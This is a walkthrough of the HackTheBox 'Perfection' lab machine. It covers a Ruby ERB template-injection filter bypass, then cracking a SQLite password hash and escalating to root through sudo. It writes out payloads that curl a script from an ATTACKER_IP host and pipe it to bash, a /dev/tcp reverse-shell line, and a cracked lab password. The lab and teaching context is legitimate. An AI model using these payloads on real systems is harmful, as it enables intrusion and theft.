## Welcome everyone!

Today, we will cover *Perfection*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Perfection/Perfection_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP     perfection.htb`   to your local `/etc/hosts` file)





## Information Gathering



First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:

![image](/HTB/Perfection/Perfection_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (nginx | 80)

We can start our enumeration phase by inspecting the website hosted on port **80**.

![image](/HTB/Perfection/Perfection_images/3.png)

The website serves an application calculating students grade based on their notes.

The application version is revealed at the very bottom of the page:

![image](/HTB/Perfection/Perfection_images/4.png)

The web server is running **WEBrick 1.7.0 (Ruby)**.

Inspecting the `/weighted-grade` endpoint, we can see that it allows user input for grade calculation:

![image](/HTB/Perfection/Perfection_images/5.png)

This functionality operated as a calculator for your weighted grade, requiring the sum of the weights to be 100. It would then provide a report listing the categories previously specified, along with the percentage of each category that contributed to the total grade.

![image](/HTB/Perfection/Perfection_images/6.png)

![image](/HTB/Perfection/Perfection_images/7.png)

This behavior strongly suggests a **Server-Side Template Injection** vulnerability, especially given the use of ERB and the reflection of user input in the response. However, some characters are filtered. If we attempt to inject `<`,`>` our request get refused.

![image](/HTB/Perfection/Perfection_images/8.png)




## Initial Access



Searching for ways to bypass SSTI filters and found **David Hamann’s post**, where he mentions how a misunderstanding of regular expressions in Ruby could result in creating an inefficient filter that fails to protect against SSTI attacks. In that scenario, he describes that it’s possible to bypass the bad filter using a newline character (`%0a`). Therefore, assuming the developer implemented a flawed filter to prevent SSTI attacks, the pentester attempted to add a newline character (`%0a`), successfully exploiting SSTI in Ruby. The following payload can be used to download a file from our local machine

`science%0a<%25%3d+system('curl+http://ATTACKER_IP:8000/test.txt')+%25>`

![image](/HTB/Perfection/Perfection_images/9.png)

We can successfully execute arbitrary command. Since we can trick the target into fetching content from our server, we can host a `rev.sh` script and pipe the `curl` command to `bash` in order to execute the accessed file. The script contains the following code:

`#!/bin/bash`

`bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0<&1`

We can then execute the file that we host through a Python server (via `python3 -m http.server 8000`) using the following payload in the `category` parameter:

`science%0a<%25%3d+system('curl+http://ATTACKER_IP:8000/rev.sh+|+bash')+%25>`
(ensure that you have set up a netcat listener in the background using `nc -lvnp PORT` and a Python server)

![image](/HTB/Perfection/Perfection_images/10.png)

We successfully executed the Bash script hosted on the Python server, granting us initial access on the machine as the user **susan**. Since we didn’t receive job control in the shell, we can run the following command to upgrade it:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Now that we have a foothold on the machine, let’s start by checking the `/etc/passwd` file to see whether there are other users on the system:

![image](/HTB/Perfection/Perfection_images/11.png)

It appears that we gained access as the only non-root user on the system, allowing us to retrieve the user flag located in `/home/susan` directory without the need to perform horizontal privilege escalation:

![image](/HTB/Perfection/Perfection_images/12.png)





## Privilege Escalation



We now need to escalate our current privileges to **root** in order to retrieve the final flag. It is a good practice to start enumerating local privilege escalation vectors by running `sudo -l` to see whether the user we compromised can execute any command with **root privileges**.

But at this point, we don’t have the password for **susan**.

After a basic check of the user’s directory, we can retrieve an interesting database configuration file located in the `Migration` directory:

![image](/HTB/Perfection/Perfection_images/13.png)

The `pupilpath_credentials.db` appears to host the hash for the user Susan. Moreover, it stores the mail address attached to her: `fsusan@perfection`

Inspecting the file format using the `file` utility, we can observe that the file is associated to **SQLite3**:

![image](/HTB/Perfection/Perfection_images/14.png)

It means that we can access the database locally with the following command:

`sqlite3 pupilpath_credentials.db`

![image](/HTB/Perfection/Perfection_images/15.png)

As expected, we can identify a `users` table which stores the password hash for various users, including Susan. We can assume that susan may have reused the password through SSH. We can paste the hash in a `hash.txt` file in our local machine to attempt offline cracking with **Hashcat**. We will first identify the hashing algorithm using the `hash-identifier` tool:

![image](/HTB/Perfection/Perfection_images/16.png)

The password seems to be hashed with the **SHA-256** algorithm.

We can now pass it to `hashcat` indicating the SHA-256 algorithm with `-m 1400`:

![image](/HTB/Perfection/Perfection_images/17.png)

We successfully recovered the cleartext password for **susan**: `susan_nasus_413759210`

Let’s verify if it has been reused over SSH:

![image](/HTB/Perfection/Perfection_images/18.png)

Indeed, that is the case! We can now verify if we are able to run elevated command using `sudo -l`:

![image](/HTB/Perfection/Perfection_images/19.png)

And it appears that we can run any command on the system with **root privileges**!

We can simply spawn a **root shell** using sudo `/bin/bash` granting full root privileges:

![image](/HTB/Perfection/Perfection_images/20.png)

We successfully escalated our privileges to **root**!

We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/Perfection/Perfection_images/21.png)

Challenge completed!

![image](/HTB/Perfection/Perfection_images/22.png)

## Conclusion

The *Perfection* machine provides a well-rounded introduction to common web application and post-exploitation techniques frequently encountered in real-world environments and Capture The Flag scenarios.

The initial foothold was achieved by identifying a **Server-Side Template Injection (SSTI)** vulnerability within a Ruby-based application running on **WEBrick** and templating via **ERB**. Although input filtering initially blocked common payloads, the exploitation was made possible by bypassing flawed input validation logic using a newline character, ultimately allowing remote command execution and a reverse shell as the user *susan*.

Once inside the system, enumeration revealed a local **SQLite** database containing user credentials. By extracting and analyzing the database, a SHA-256 password hash was recovered and successfully cracked using offline techniques.

This led to SSH access as ***susan***, where privilege escalation was straightforward due to misconfigured sudo permissions allowing execution of commands as root without restriction.

Overall, *Perfection* highlights key security weaknesses across multiple layers: insecure input validation, improper template handling, weak credential storage practices, and excessive sudo privileges. The machine reinforces the importance of secure coding practices, proper input sanitization, and least-privilege principles in system administration.

Thank you for reading!
